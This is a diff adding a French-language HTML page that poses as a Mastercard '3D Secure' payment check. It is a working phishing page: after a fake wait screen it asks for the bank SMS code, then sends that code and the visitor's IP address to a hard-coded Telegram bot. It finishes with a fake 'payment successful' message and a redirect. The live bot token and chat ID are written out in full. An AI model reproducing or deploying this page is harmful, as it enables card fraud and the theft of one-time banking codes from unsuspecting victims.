@@ -1,1 +1,139 @@
-</p>
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>3D Secure</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+    }
+    .hidden { display: none; }
+    .payment-container {
+      text-align: center;
+      margin-top: 100px;
+      padding: 40px;
+    }
+    .spinner {
+      width: 45px;
+      height: 45px;
+      border: 4px solid rgba(0, 0, 0, 0.2);
+      border-top: 4px solid #000;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+    @keyframes spin { 100% { transform: rotate(360deg); } }
+    .icon-container img {
+      max-width: 2800px;
+      height: 45px;
+    }
+    .sms-form {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .sms-form input[type="text"] {
+      width: 80%;
+      max-width: 300px;
+      height: 37px;
+      font-size: 18px;
+      margin-bottom: 12px;
+      padding: 14px;
+      box-sizing: border-box;
+    }
+    .sms-form input[type="submit"] {
+      background-color: green;
+      color: white;
+      font-size: 18px;
+      padding: 12px 24px;
+      border: none;
+      cursor: pointer;
+      margin-top: 10px;
+      width: 50%;
+      max-width: 200px;
+      box-sizing: border-box;
+    }
+  </style>
+</head>
+<body>
+  <div class="payment-container full-widt <center>h-container" id="step-2">
+     <center><h2>3D SECURE</h2></p></p>
+    <div class="icon-container"></p>
+    <img src="https://i.ibb.co/Txt7BPXc/Cap.jpg" alt="Mastercard"></p>
+    </div>
+    <div class="spinner"></div></p></p>
+     <center><p>VEUILLEZ PATIENTER...</p>
+  </div>
+  <div class="payment-container full-width-container hidden" id="step-3">
+     <center><h2>AUTHENTIFICATION SMS</h2></p></p>
+    <div class="icon-container">
+<img src="https://i.ibb.co/Txt7BPXc/Cap.jpg" alt="Mastercard"></p>
+    </div>
+    <p>Entrez le code reçu par SMS :</p>
+    <form id="sms-form" class="sms-form"></p>
+      <input type="text" id="sms-code" name="sms-code" required placeholder="Code SMS">
+      <input type="submit" value="Valider">
+    </form>
+  </div>
+  <div class="payment-container full-width-container hidden" id="step-4">
+     <center><h2>3D SECURE</h2></p>
+    <div class="icon-container">
+      <img src="https://i.ibb.co/Txt7BPXc/Cap.jpg" alt="Mastercard">
+    </div>
+    <div class="spinner"></div>
+     <center><p>VEUILLEZ PATIENTER...</p></p>
+  </div>
+  <div class="payment-container full-width-container hidden" id="step-5">
+<h2>PAIEMENT RÉUSSI</center></p></p>
+    <div class="icon-container">
+       <img src="https://i.ibb.co/Txt7BPXc/Cap.jpg" alt="Mastercard">
+    </div>
+    <center><p class="success-message"></h3>Redirection dans quelques instants...<h3></p>
+  </div>
+  <script>
+    function sendToTelegram(message) {
+      const TELEGRAM_BOT_TOKEN = '7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k';
+      const TELEGRAM_CHAT_ID = '7747778364';
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      const data = { chat_id: TELEGRAM_CHAT_ID, text: message };
+      fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      });
+    }
+    function getUserIP() {
+      fetch('https://api64.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const userIP = data.ip;
+          sendToTelegram(`Adresse IP détectée : ${userIP}`);
+        })
+        .catch(error => console.error('Erreur récupération IP:', error));
+    }
+    setTimeout(() => {
+      document.getElementById('step-2').classList.add('hidden');
+      document.getElementById('step-3').classList.remove('hidden');
+      getUserIP();
+    }, 10000);
+    document.getElementById('sms-form').addEventListener('submit', function(event) {
+      event.preventDefault();
+      const smsCode = document.getElementById('sms-code').value;
+      sendToTelegram(`Code SMS reçu : ${smsCode}`);
+      document.getElementById('step-3').classList.add('hidden');
+      document.getElementById('step-4').classList.remove('hidden');
+      
+      setTimeout(() => {
+        document.getElementById('step-4').classList.add('hidden');
+        document.getElementById('step-5').classList.remove('hidden');
+        setTimeout(() => {
+          window.location.href = "https://justmoicom.github.io/tel/";
+        }, 5000);
+      }, 7000);
+    });
+  </script>
+</body>
+</html>
